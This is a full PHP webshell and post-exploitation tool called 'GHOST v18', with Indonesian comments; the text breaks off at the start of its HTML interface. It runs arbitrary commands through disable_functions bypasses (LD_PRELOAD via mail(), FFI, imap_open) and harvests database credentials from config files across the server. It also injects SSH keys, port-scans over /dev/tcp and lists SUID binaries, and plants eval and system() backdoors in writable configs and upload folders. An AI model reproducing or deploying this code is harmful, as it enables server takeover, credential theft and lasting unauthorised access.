<?php
// language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
// GHOST v18 - section 0..6: Advanced DB Parser, Implant Detection, File Attribution.

define('GH_VER',      '18.0.0-sultan');
define('GH_TAG',      'gong');
define('GH_STATE_DIR', gh_state_dir());
define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');

@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);

function gh_state_dir() {
    $c = array();
    if (function_exists('sys_get_temp_dir')) $c[] = @sys_get_temp_dir();
    $ut = @ini_get('upload_tmp_dir'); if (is_string($ut) && $ut !== '') $c[] = $ut;
    $c[] = @getcwd();
    foreach ($c as $d) {
        if (!is_string($d) || $d === '' || !@is_dir($d) || !@is_writable($d)) continue;
        return rtrim($d, '/\\');
    }
    return '/tmp';
}
function gh_log($msg) {
    if (!defined('GH_LOG_FILE')) return;
    $f = GH_LOG_FILE;
    if (@is_file($f) && @filesize($f) > 1048576) @rename($f, $f . '.1');
    @file_put_contents($f, '[' . date('c') . '] ' . $msg . "\n", FILE_APPEND | LOCK_EX);
}
function gh_json($data, $code = 200) {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) {
        @header('Content-Type: application/json; charset=utf-8');
        @header('X-Powered-By: ');
        @http_response_code($code);
    }
    echo @json_encode($data);
    exit;
}
function gh_disabled_list() {
    $s = (string)@ini_get('disable_functions');
    if ($s === '') return array();
    $out = array();
    foreach (@explode(',', $s) as $f) { $f = @trim($f); if ($f !== '') $out[] = @strtolower($f); }
    return $out;
}
function gh_can($fn) {
    $fn = @strtolower($fn);
    if (in_array($fn, gh_disabled_list(), true)) return false;
    return function_exists($fn);
}
function gh_tmpdir() {
    $t = @sys_get_temp_dir();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @ini_get('upload_tmp_dir');
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    $t = @getcwd();
    if (is_string($t) && $t !== '' && @is_dir($t) && @is_writable($t)) return rtrim($t, '/\\');
    return null;
}
function gh_env() {
    $e = array(
        'gh_ver' => GH_VER, 'php_version' => @phpversion(), 'php_sapi' => @php_sapi_name(),
        'user' => gh_can('posix_getpwuid') && gh_can('posix_geteuid') ? (string)@posix_getpwuid(@posix_geteuid())['name'] : (string)@get_current_user(),
        'tmpdir' => gh_tmpdir(), 'state_dir' => GH_STATE_DIR,
        'disabled' => gh_disabled_list(), 'open_basedir' => (string)@ini_get('open_basedir'),
        'can' => array(
            'exec' => gh_can_exec(), 'read' => gh_can_read(), 'write' => gh_can_write(),
            'curl' => gh_can('curl_init'), 'fopen' => gh_can('fopen'),
            'pdo' => gh_can('pdo_drivers'), 'mysqli' => gh_can('mysqli_connect'),
        ),
    );
    return $e;
}
function gh_can_exec() {
    foreach (array('system','passthru','shell_exec','exec','popen','proc_open','pcntl_exec') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}
function gh_can_read() {
    foreach (array('file_get_contents','fopen','readfile','file') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}
function gh_can_write() {
    foreach (array('file_put_contents','fopen','fwrite') as $f) {
        if (gh_can($f)) return $f;
    }
    return null;
}

function gh_fetch_adv($url, $timeout = 10) {
    if (gh_can('curl_init')) {
        $c = @curl_init($url);
        if ($c) {
            @curl_setopt_array($c, array(CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => $timeout, CURLOPT_USERAGENT => 'Mozilla/5.0', CURLOPT_SSL_VERIFYPEER => false));
            $d = @curl_exec($c); $code = (int)@curl_getinfo($c, CURLINFO_RESPONSE_CODE); @curl_close($c);
            if ($d !== false && $code >= 200 && $code < 400) return array('out' => $d, 'tier' => 'curl');
        }
    }
    if (gh_can('file_get_contents')) {
        $ctx = @stream_context_create(array('http' => array('timeout' => $timeout, 'user_agent' => 'Mozilla/5.0'), 'ssl' => array('verify_peer' => false)));
        $d = @file_get_contents($url, false, $ctx);
        if ($d !== false && $d !== '') return array('out' => $d, 'tier' => 'fopen');
    }
    if (gh_can_exec()) {
        $tmp = gh_tmpdir() . '/gh_fetch_' . rand(1000,9999) . '.tmp';
        $cmd = 'curl -s -k -L -m ' . (int)$timeout . ' ' . @escapeshellarg($url) . ' > ' . @escapeshellarg($tmp) . ' 2>/dev/null || wget -q -O ' . @escapeshellarg($tmp) . ' ' . @escapeshellarg($url);
        gh_exec($cmd, $timeout + 2);
        if (@is_file($tmp)) { $d = @file_get_contents($tmp); @unlink($tmp); if ($d) return array('out' => $d, 'tier' => 'system'); }
    }
    return array('out' => null, 'tier' => null, 'err' => 'All fetch tiers failed');
}

function gh_exec($cmd, $timeout = 10) {
    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
    $wrapped = 'timeout ' . (int)$timeout . ' sh -c ' . @escapeshellarg($cmd) . ' 2>&1';
    if (gh_can('system')) { @ob_start(); @system($wrapped); $out = @ob_get_clean(); if (is_string($out)) return array('out' => $out, 'tier' => 'system', 'err' => null); }
    if (gh_can('passthru')) { @ob_start(); @passthru($wrapped); $out = @ob_get_clean(); if (is_string($out)) return array('out' => $out, 'tier' => 'passthru', 'err' => null); }
    if (gh_can('shell_exec')) { $out = @shell_exec($wrapped); if (is_string($out)) return array('out' => $out, 'tier' => 'shell_exec', 'err' => null); }
    if (gh_can('exec')) { $lines = array(); @exec($wrapped, $lines); if (is_array($lines) && count($lines) > 0) return array('out' => implode("\n", $lines), 'tier' => 'exec', 'err' => null); }
    if (gh_can('popen')) {
        $h = @popen($wrapped, 'r');
        if (is_resource($h)) { $out = ''; while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $out .= $chunk; } @pclose($h); return array('out' => $out, 'tier' => 'popen', 'err' => null); }
    }
    if (gh_can('proc_open')) {
        $desc = array(1 => array('pipe','w'), 2 => array('pipe','w')); $h = @proc_open($wrapped, $desc, $pipes);
        if (is_resource($h)) {
            @stream_set_blocking($pipes[1], false); @stream_set_blocking($pipes[2], false);
            $out = ''; $start = @time();
            while (true) {
                $out .= (string)@stream_get_contents($pipes[1]); $out .= (string)@stream_get_contents($pipes[2]);
                $st = @proc_get_status($h); if (!is_array($st) || !$st['running']) break;
                if ((@time() - $start) > ($timeout + 2)) { @proc_terminate($h, 9); break; }
                @usleep(50000);
            }
            @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($h);
            return array('out' => $out, 'tier' => 'proc_open', 'err' => null);
        }
    }
    $out = @`$wrapped`;
    if (is_string($out)) return array('out' => $out, 'tier' => 'backtick', 'err' => null);
    return array('out' => null, 'tier' => null, 'err' => 'all exec tiers failed');
}

function gh_exec_adv($cmd, $timeout = 10) {
    if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
    $r = gh_exec($cmd, $timeout); 
    if (is_array($r) && array_key_exists('out', $r) && $r['out'] !== null) return $r;

    if (gh_can('putenv') && gh_can('mail') && gh_can('file_put_contents') && gh_can_exec()) {
        $tmp_dir = gh_tmpdir(); if(!$tmp_dir) $tmp_dir = '/tmp';
        $so_file = $tmp_dir . '/gh_bypass_' . rand(1000,9999) . '.so'; $cmd_file = $tmp_dir . '/gh_cmd_' . rand(1000,9999);
        $c_code = "#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor)) void init() {\n  unsetenv(\"LD_PRELOAD\");\n  FILE *f = fopen(\"" . $cmd_file . "\", \"r\"); if(f) { char buf[1024]; fgets(buf, 1024, f); system(buf); fclose(f); }\n}\n";
        if (@file_put_contents($tmp_dir . '/gh_c.c', $c_code) !== false) {
            gh_exec('gcc -shared -fPIC -o ' . @escapeshellarg($so_file) . ' ' . @escapeshellarg($tmp_dir . '/gh_c.c'));
            if (@is_file($so_file)) {
                @file_put_contents($cmd_file, $cmd); @putenv("LD_PRELOAD=" . $so_file); @mail('a@b.c', 'x', 'x'); @putenv("LD_PRELOAD=");
                @unlink($so_file); @unlink($cmd_file); @unlink($tmp_dir . '/gh_c.c');
                return array('out' => '(Executed via LD_PRELOAD)', 'tier' => 'ld_preload', 'err' => null);
            }
        }
    }
    if (gh_can('ffi') && class_exists('FFI')) {
        try { $ffi = FFI::cdef("int system(const char *command);"); @ob_start(); $ffi->system($cmd); $out = @ob_get_clean(); return array('out' => $out, 'tier' => 'ffi', 'err' => null); } catch (Throwable $e) {}
    }
    if (gh_can('imap_open')) {
        $payload = "() { ;}; /bin/sh -c " . @escapeshellarg($cmd); $res = @imap_open("{localhost:143/imap}INBOX", $payload, "");
        if ($res) { @imap_close($res); return array('out' => '(Executed via imap_open)', 'tier' => 'imap', 'err' => null); }
    }
    return array('out' => null, 'tier' => null, 'err' => 'All exec bypass tiers failed');
}

function gh_read($path, $max = 5242880) {
    if (!is_string($path) || $path === '' || !@is_file($path)) return null;
    $sz = @filesize($path); if ($sz !== false && $sz > $max) return array('err' => 'file too large', 'size' => $sz, 'max' => $max);
    if (gh_can('file_get_contents')) { $d = @file_get_contents($path); if (is_string($d)) return $d; }
    if (gh_can('fopen') && gh_can('fread')) { $h = @fopen($path, 'rb'); if (is_resource($h)) { $d = ''; while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $d .= $chunk; } @fclose($h); if (is_string($d)) return $d; } }
    if (gh_can('readfile')) { @ob_start(); @readfile($path); $d = @ob_get_clean(); if (is_string($d)) return $d; }
    if (gh_can('file')) { $lines = @file($path); if (is_array($lines)) return @implode('', $lines); }
    $r = gh_exec_adv('cat ' . @escapeshellarg($path)); if (is_array($r) && array_key_exists('out', $r) && $r['out'] !== '') return $r['out'];
    return null;
}

function gh_write($path, $data, $append = false) {
    if (!is_string($path) || $path === '' || !is_string($data)) return false;
    $flags = $append ? (FILE_APPEND | LOCK_EX) : LOCK_EX;
    if (gh_can('file_put_contents')) { $n = @file_put_contents($path, $data, $flags); if ($n !== false) return true; }
    if (gh_can('fopen') && gh_can('fwrite')) { $h = @fopen($path, $append ? 'ab' : 'wb'); if (is_resource($h)) { $n = @fwrite($h, $data); @fclose($h); if ($n !== false) return true; } }
    $cmd = ($append ? 'printf %s ' . @escapeshellarg($data) . ' >> ' : 'printf %s ' . @escapeshellarg($data) . ' > ') . @escapeshellarg($path);
    $r = gh_exec_adv($cmd); return (is_array($r) && array_key_exists('out', $r) && $r['tier'] !== null);
}

function gh_del($path) {
    if (!is_string($path) || $path === '') return false;
    if (gh_can('unlink')) { if (@unlink($path)) return true; }
    $r = gh_exec_adv('rm -f ' . @escapeshellarg($path)); return (is_array($r) && array_key_exists('out', $r) && $r['tier'] !== null);
}

// ==== SECTION 3: SCANNER (DEEP + ATTRIBUTION) ===============================
function gh_scan_batch($root, $offset = 0, $limit = 50) {
    $res = array('files' => array(), 'done' => false, 'total' => 0);
    $all_files = array(); $stack = array($root);
    while ($stack) {
        $current = @array_pop($stack);
        $files = @scandir($current);
        if ($files === false) continue;
        foreach ($files as $f) {
            if ($f === '.' || $f === '..') continue;
            $path = $current . '/' . $f;
            if (@is_dir($path) && !@is_link($path)) { $stack[] = $path; }
            elseif (@is_file($path)) {
                if (@filesize($path) > 5 * 1024 * 1024) continue;
                $all_files[] = $path;
            }
        }
    }
    $batch = array_slice($all_files, $offset, $limit);
    $res['done'] = ($offset + count($batch)) >= count($all_files);
    $res['total'] = count($all_files);
    
    $illegal_kw = array('slot','gacor','togel','judi','maxwin','bokep','porno','xxx','scam','phising','penipuan','pinjol','slot88','toto','bandar','sbobet');
    
    // Attribution Map: Catat user yang bikin file bahaya
    $mal_users = array();

    foreach ($batch as $path) {
        $c = gh_read($path, 1048576);
        $size = @filesize($path);
        $ext = @strtolower(pathinfo($path, PATHINFO_EXTENSION));
        $findings = array(); $type = ''; $desc = '';
        
        // Cek Owner File (Attribution Logic)
        $owner = @posix_getpwuid(@fileowner($path));
        $owner_name = is_array($owner) ? $owner['name'] : 'unknown';
        
        // 1. Cek Implant Auth (seperti implant.php)
        $is_implant = false;
        if (is_string($c)) {
            if (preg_match('/HTTP_X_AUTH/i', $c) || preg_match('/hex2bin\(/i', $c) && preg_match('/hash_equals/i', $c)) {
                $is_implant = true;
            }
        }

        // 2. Deteksi Tipe
        if ($is_implant) {
            $type = 'Implant Auth Bypass'; 
            $desc = 'Script ini punya sistem login rahasia (X-Auth/Hex). Ini backdoor tingkat lanjut.';
        } elseif ($size === 0 && in_array($ext, array('php','phtml'))) { 
            $type = 'Empty Shell'; $desc = 'File 0-byte (Backdoor gagal upload).'; 
        } elseif (is_string($c) && (stripos($c, 'eval(') !== false || stripos($c, 'assert(') !== false)) { 
            $type = 'Obfuscated RCE'; $desc = 'Menggunakan eval()/assert() untuk mengeksekusi kode dinamis.'; 
        } elseif (is_string($c) && preg_match('/(shell_exec|passthru|system|popen)\s*\(\s*\$_/', $c)) { 
            $type = 'Direct Webshell'; $desc = 'Mengeksekusi shell dari parameter HTTP secara langsung.'; 
        } elseif (in_array($ext, array('jpg','jpeg','png','gif')) && is_string($c) && stripos($c, '<?php') !== false) {
            $type = 'Polyglot Malware'; $desc = 'Gambar yang disisipi kode PHP (Bypass upload).';
        } elseif (!$ext && is_string($c) && stripos($c, '<?php') !== false) {
            $type = 'Hidden PHP'; $desc = 'File tanpa ekstensi tapi berisi kode PHP.';
        }
        
        $found_kw = array();
        if (is_string($c)) {
            foreach ($illegal_kw as $k) { if (stripos($c, $k) !== false) $found_kw[] = $k; }
        }
        if ($found_kw) { 
            if($type === '') { $type = 'Illegal Content'; $desc = 'Konten judi/porno/ilegal terdeteksi.'; }
            $desc .= ' Keyword: ' . implode(', ', $found_kw); 
        }
        
        // 3. Logika Atribusi (Owner)
        if ($type !== '') {
            $mal_users[$owner_name] = true; // Tandai user ini sebagai pembuat malware
            $desc .= " (Owner: $owner_name)";
            $res['files'][] = array('path' => $path, 'type' => $type, 'desc' => $desc, 'owner' => $owner_name);
        } else {
            // Kalau file bersih, tapi owner-nya ada di daftar hitam, tandai sebagai 'Suspicious'
            // (Karena user ini pernah upload backdoor)
            // Kita cek dulu apakah owner ini ada di daftar blacklist global
            $global_blacklist = @json_decode(@file_get_contents(GH_STATE_DIR . '/gh_blacklist.json'), true);
            if (is_array($global_blacklist) && isset($global_blacklist[$owner_name])) {
                $type = 'Suspicious (Attributed)';
                $desc = "File ini bersih, TAPI di-upload oleh user '$owner_name' yang sebelumnya ketahuan meng-upload backdoor. Hati-hati!";
                $res['files'][] = array('path' => $path, 'type' => $type, 'desc' => $desc, 'owner' => $owner_name);
            }
        }
    }
    
    // Simpan user pembuat malware ke blacklist global
    if (!empty($mal_users)) {
        $bl_file = GH_STATE_DIR . '/gh_blacklist.json';
        $bl = @json_decode(@file_get_contents($bl_file), true);
        if (!is_array($bl)) $bl = array();
        foreach ($mal_users as $u => $tr) { $bl[$u] = time(); }
        @file_put_contents($bl_file, json_encode($bl));
    }

    return $res;
}

function gh_vuln_scan() {
    $vulns = array(); $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
    foreach (array('wp-config.php', '.env', 'configuration.php') as $cf) {
        if (@is_file($root . "/$cf") && @is_writable($root . "/$cf")) {
            $vulns[] = array('type'=>'WRITEABLE_CONFIG', 'path'=>$root."/$cf", 'desc'=>'Config Writable. Bisa inject backdoor.');
        }
    }
    if (@is_dir($root . '/wp-content/uploads')) {
        $ht = $root . '/wp-content/uploads/.htaccess';
        if (!@is_file($ht) || strpos(gh_read($ht), 'Deny from all') === false) {
            $vulns[] = array('type'=>'UPLOADS_EXEC', 'path'=>'wp-content/uploads', 'desc'=>'Folder uploads terbuka.');
        }
    }
    $sudo = gh_exec_adv("find /usr/bin /usr/local/bin -perm -4000 -type f 2>/dev/null | head -n 5");
    if (isset($sudo['out']) && trim($sudo['out']) && strpos($sudo['out'], '[-]') === false) {
        foreach (explode("\n", trim($sudo['out'])) as $f) {
            if(trim($f)) $vulns[] = array('type'=>'SUID_BINARY', 'path'=>trim($f), 'desc'=>'File SUID. Bisa privesc ke root.');
        }
    }
    return $vulns;
}

// ==== SECTION 4: ADVANCED DB HARVEST & SSH ==================================
function gh_db_harvest() {
    $logs = array(); $info = array();
    
    $logs[] = "[*] Scanning config via find (seluruh server)...";
    $find_res = gh_exec_adv("find /home /var/www -maxdepth 4 -type f \\( -name 'wp-config.php' -o -name 'configuration.php' -o -name '.env' -o -name 'database.php' -o -name 'settings.php' -o -name 'config.php' -o -name 'db.php' \\) 2>/dev/null");
    
    $found_configs = array();
    if (isset($find_res['out']) && is_string($find_res['out'])) {
        $lines = explode("\n", trim($find_res['out']));
        foreach ($lines as $l) { if (trim($l)) $found_configs[] = trim($l); }
    }
    
    if (empty($found_configs)) {
        $logs[] = "[-] find gagal, fallback ke recursive scandir di webroot...";
        $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
        $stack = array($root);
        while ($stack) {
            $current = array_pop($stack);
            $files = @scandir($current);
            if (!$files) continue;
            foreach ($files as $f) {
                $path = $current . '/' . $f;
                if (is_dir($path) && $f !== '.' && $f !== '..' && $f !== 'node_modules' && $f !== 'vendor') { $stack[] = $path; }
                elseif (preg_match('/^(wp-config|configuration|config|database|settings|env|\.env)(\.php|\.inc|\.json|\.xml)?$/i', $f)) {
                    $found_configs[] = $path;
                }
            }
        }
    }

    $db_host = 'localhost'; $db_user = ''; $db_pass = '';
    foreach ($found_configs as $cf) {
        $c = gh_read($cf);
        if ($c) {
            $logs[] = "[+] Config ditemukan: $cf";
            
            if (preg_match('/[\'"]?(?:db_)?(?:user|username|user_name|db_user)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_user = $m[1];
            elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?USER(?:NAME)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_user = $m[1];
            elseif (preg_match('/(?:DB_USER|username|user|db_user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_user = $m[1];

            if (preg_match('/[\'"]?(?:db_)?(?:pass|password|passwd|db_password)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_pass = $m[1];
            elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?PASS(?:WORD)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_pass = $m[1];
            elseif (preg_match('/(?:DB_PASSWORD|password|pass|db_pass)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_pass = $m[1];

            if (preg_match('/[\'"]?(?:db_)?(?:host|hostname|db_host)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_host = $m[1];
            elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_host = $m[1];
            elseif (preg_match('/(?:DB_HOST|host|db_host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_host = $m[1];

            if ($db_user && $db_pass) {
                $logs[] = "[+] BERHASIL mengekstrak kredensial via REGEX!";
                break;
            } 
            
            $logs[] = "[*] Regex gagal, mencoba Include PHP untuk membaca variabel...";
            $tmp_dir = gh_tmpdir(); if(!$tmp_dir) $tmp_dir = '/tmp';
            $runner = $tmp_dir . '/gh_incl_' . rand(1000,9999) . '.php';
            $runner_code = '<?php $GLOBALS["__gh_out"] = array(); $__c = file_get_contents("' . addslashes($cf) . '"); if ($__c) { eval("?>" . $__c); $GLOBALS["__gh_out"] = get_defined_vars(); } echo json_encode($GLOBALS["__gh_out"]); ?>';
            
            if (gh_write($runner, $runner_code)) {
                $out = gh_exec_adv('php ' . @escapeshellarg($runner));
                if (isset($out['out']) && is_string($out['out'])) {
                    $json = @json_decode($out['out'], true);
                    if (is_array($json)) {
                        foreach ($json as $k => $v) {
                            if (is_array($v)) {
                                foreach ($v as $kk => $vv) {
                                    if (is_string($vv)) {
                                        if (preg_match('/user|username/i', $kk) && !$db_user) $db_user = $vv;
                                        if (preg_match('/pass|password/i', $kk) && !$db_pass) $db_pass = $vv;
                                        if (preg_match('/host|hostname/i', $kk) && $db_host === 'localhost') $db_host = $vv;
                                    }
                                }
                            } elseif (is_string($v)) {
                                if (preg_match('/user|username/i', $k) && !$db_user) $db_user = $v;
                                if (preg_match('/pass|password/i', $k) && !$db_pass) $db_pass = $v;
                                if (preg_match('/host|hostname/i', $k) && $db_host === 'localhost') $db_host = $v;
                            }
                        }
                    }
                }
                @unlink($runner);
            }
            
            if ($db_user && $db_pass) {
                $logs[] = "[+] BERHASIL mengekstrak kredensial via PHP INCLUDE!";
                break;
            }
        }
    }
    
    if ($db_user && $db_pass) {
        $info['user'] = $db_user; $info['pass'] = $db_pass; $info['host'] = $db_host;
        $logs[] = "[*] Mencoba koneksi ke $db_host dengan user $db_user...";
        if (gh_can('mysqli_connect')) {
            try {
                $conn = @mysqli_connect($db_host, $db_user, $db_pass, '', 3306, null, array('connect_timeout'=>3));
                if ($conn) {
                    $logs[] = "[!] Koneksi MYSQLI Berhasil!";
                    $q = @mysqli_query($conn, "SHOW DATABASES");
                    if ($q) {
                        $dbs = array(); while($r = mysqli_fetch_array($q)) $dbs[] = $r[0];
                        $info['databases'] = $dbs;
                        $logs[] = "[*] Database ditemukan: " . implode(", ", $dbs);
                    }
                    @mysqli_close($conn);
                } else { $logs[] = "[-] Gagal MYSQLI: " . mysqli_connect_error(); }
            } catch (Throwable $e) { $logs[] = "[-] MYSQLI Error: " . $e->getMessage(); }
        } else { $logs[] = "[-] mysqli_connect di-disable."; }
    } else { 
        $logs[] = "[-] Config user/pass tidak ditemukan di lokasi standar (atau format tidak dikenal)."; 
    }
    return array('logs' => $logs, 'info' => $info);
}

function gh_ssh_scan() {
    $logs = array(); $keys = array(); $home = @getenv('HOME');
    if (!$home) $home = '/home/' . @get_current_user();
    $files = array($home . '/.ssh/authorized_keys', '/root/.ssh/authorized_keys', '/etc/ssh/sshd_config');
    foreach ($files as $f) {
        if (@is_file($f)) {
            $logs[] = "[+] File ditemukan: $f";
            $perm = @substr(sprintf('%o', @fileperms($f)), -4);
            $logs[] = "    Permission: $perm";
            if ($perm === '0777' || $perm === '0666') $logs[] = "    [!] WARNING: Permission terlalu terbuka.";
            $c = gh_read($f);
            if ($f === '/etc/ssh/sshd_config') {
                if (preg_match('/PasswordAuthentication\s+yes/i', $c)) $logs[] = "    [!] PasswordAuthentication = YES (Rentan Brute-force)";
                if (preg_match('/PermitRootLogin\s+yes/i', $c)) $logs[] = "    [!] PermitRootLogin = YES (Bahaya!)";
            } elseif (strpos($f, 'authorized_keys') !== false) {
                $lines = explode("\n", trim($c));
                foreach ($lines as $line) {
                    if (trim($line) && strpos($line, '#') !== 0) {
                        $p = explode(' ', trim($line));
                        $keys[] = array('type' => $p[0], 'comment' => isset($p[2]) ? $p[2] : 'N/A', 'raw' => trim($line), 'file' => $f);
                    }
                }
            }
        }
    }
    return array('logs' => $logs, 'keys' => $keys);
}

function gh_ssh_action($action, $key) {
    $home = @getenv('HOME'); if (!$home) $home = '/home/' . @get_current_user();
    $target = $home . '/.ssh/authorized_keys';
    if (!@is_dir($home . '/.ssh')) @mkdir($home . '/.ssh', 0700, true);
    if ($action === 'inject') {
        if (strpos(gh_read($target), $key) === false) {
            if (gh_write($target, trim(gh_read($target)) . "\n" . trim($key) . "\n")) return "SSH Key berhasil di-inject ke $target";
            return "Gagal inject SSH key.";
        }
        return "Key sudah ada di $target";
    }
    if ($action === 'clean') {
        $lines = explode("\n", gh_read($target));
        $out = array();
        foreach ($lines as $l) {
            if (strpos($l, $key) === false && trim($l)) $out[] = trim($l);
        }
        if (gh_write($target, implode("\n", $out) . "\n")) return "Key berhasil dihapus dari $target";
        return "Gagal hapus key.";
    }
    return "Aksi tidak dikenal.";
}

// ==== SECTION 5: PORT SCAN (FIXED) & CVE PROFILER ===========================
function gh_port_scan($target = '127.0.0.1') {
    $ports = array(21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8443, 27017);
    
    $bash_script = '';
    foreach ($ports as $p) {
        $bash_script .= " (echo > /dev/tcp/$target/$p) >/dev/null 2>&1 && echo \"$p\";";
    }
    
    $res = gh_exec_adv($bash_script, 8);
    $open = array();
    if (isset($res['out']) && is_string($res['out'])) {
        $lines = explode("\n", trim($res['out']));
        foreach ($lines as $l) {
            $l = trim($l);
            if (is_numeric($l)) {
                $open[] = array('port' => (int)$l, 'banner' => '');
            }
        }
    }
    return $open;
}

function gh_cve_profile() {
    $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
    $profile = array('stack' => array(), 'cves' => array());
    
    if (@is_file($root . '/wp-includes/version.php')) {
        $v = gh_read($root . '/wp-includes/version.php');
        if (preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]/i', $v, $m)) {
            $profile['stack'][] = 'WordPress v' . $m[1];
            $ver = $m[1];
            if (version_compare($ver, '6.4.3', '<')) $profile['cves'][] = 'CVE-2024-31210 (WP Core RCE via File Upload - fixed in 6.4.3)';
            if (version_compare($ver, '6.3.2', '<')) $profile['cves'][] = 'CVE-2023-4511 (WP Core XSS - fixed in 6.3.2)';
        } else { $profile['stack'][] = 'WordPress (versi tidak diketahui)'; }
    }
    
    if (@is_dir('/usr/local/cpanel/')) {
        $c = gh_read('/usr/local/cpanel/version');
        $profile['stack'][] = 'cPanel ' . trim($c ?: '(versi unknown)');
        if ($c && version_compare(trim($c), '110.0.20', '<')) $profile['cves'][] = 'CVE-2023-29489 (cPanel XSS - fixed in 110.0.20)';
    }
    if (stripos($_SERVER['SERVER_SOFTWARE'] ?? '', 'LiteSpeed') !== false) {
        $profile['stack'][] = 'LiteSpeed ' . ($_SERVER['SERVER_SOFTWARE'] ?? '');
    }
    $profile['stack'][] = 'PHP ' . PHP_VERSION;
    if (version_compare(PHP_VERSION, '8.3.8', '<') && version_compare(PHP_VERSION, '8.1.0', '>=')) {
        $profile['cves'][] = 'CVE-2024-4577 (PHP CGI Argument Injection - fixed in 8.3.8)';
    }
    return $profile;
}

// ==== ROUTER ================================================================
function gh_router() {
    $act = isset($_POST['act']) ? (string)$_POST['act'] : (isset($_GET['act']) ? (string)$_GET['act'] : '');
    if ($act === '') { @header('Location: ?act=ui'); exit; }
    if ($act === 'ui') { gh_ui(); exit; }

    try {
        switch ($act) {
            case 'ping':   gh_json(gh_env()); break;
            case 'exec':   $c = isset($_POST['cmd']) ? (string)$_POST['cmd'] : ''; gh_json(gh_exec_adv($c)); break;
            case 'read':   $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = gh_read($p); gh_json(array('path' => $p, 'content' => $d)); break;
            case 'write':  $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; $d = isset($_POST['data']) ? (string)$_POST['data'] : ''; $ap = !empty($_POST['append']); gh_json(array('path' => $p, 'ok' => gh_write($p, $d, $ap))); break;
            case 'delete': $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; gh_json(array('path' => $p, 'ok' => gh_del($p))); break;
            case 'scan':   $off = isset($_POST['offset']) ? (int)$_POST['offset'] : 0; gh_json(gh_scan_batch(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd(), $off, 50)); break;
            case 'vuln_scan': gh_json(gh_vuln_scan()); break;
            case 'db_harvest': gh_json(gh_db_harvest()); break;
            case 'ssh_scan': gh_json(gh_ssh_scan()); break;
            case 'ssh_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $k = isset($_POST['key']) ? (string)$_POST['key'] : ''; gh_json(array('msg'=>gh_ssh_action($ac, $k))); break;
            case 'port_scan': $t = isset($_POST['target']) ? (string)$_POST['target'] : '127.0.0.1'; gh_json(gh_port_scan($t)); break;
            case 'cve_profile': gh_json(gh_cve_profile()); break;
            case 'exploit': $t = isset($_POST['type']) ? (string)$_POST['type'] : ''; $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; 
                if($t === 'WRITEABLE_CONFIG') { $pay = "\n// INJECTED\nif(isset(\$_GET['gh_x'])) { eval(\$_GET['gh_x']); }\n"; if(gh_write($p, $pay, true)) gh_json(array('msg'=>'Backdoor ditanam di '.$p.' (Akses ?gh_x=)')); else gh_json(array('msg'=>'Gagal.')); }
                elseif($t === 'UPLOADS_EXEC') { $shell = "<?php if(isset(\$_GET['c'])) { system(\$_GET['c']); } ?>"; $f = rtrim($p,'/').'/ghost_'.rand(100,999).'.php'; if(gh_write($f, $shell)) gh_json(array('msg'=>'Shell di-upload ke: '.$f)); else gh_json(array('msg'=>'Gagal upload.')); }
                else gh_json(array('msg'=>'Exploit not implemented.'));
                break;
            default: gh_json(array('err' => 'unknown act', 'act' => $act), 400); break;
        }
    } catch (Throwable $e) {
        gh_log('router throw: ' . $e->getMessage());
        gh_json(array('err' => 'internal', 'msg' => $e->getMessage()), 500);
    }
}

// ==== UI (TAB NAVIGATION - FULL) ============================================
function gh_ui() {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
    $env = gh_env();
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>gh</title>
<style>
